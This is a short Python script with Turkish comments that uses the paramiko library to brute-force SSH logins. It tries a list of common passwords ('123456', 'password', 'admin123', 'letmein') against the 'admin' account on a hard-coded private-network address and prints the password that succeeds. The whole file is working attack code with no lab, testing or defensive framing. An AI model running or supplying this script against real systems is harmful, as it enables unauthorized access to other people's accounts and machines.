import paramiko

# Hedef IP ve port bilgisi
target_ip = "192.168.1.100"
target_port = 22
username = "admin"
passwords = ["123456", "password", "admin123", "letmein"]

# SSH ile bağlanma ve şifreyi test etme
def brute_force_ssh(target_ip, target_port, username, passwords):
    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, port=target_port, username=username, password=password)
            print(f"Başarılı giriş! Şifre: {password}")
            ssh.close()
            break
        except:
            print(f"Başarısız giriş! Şifre: {password}")
            continue

brute_force_ssh(target_ip, target_port, username, passwords)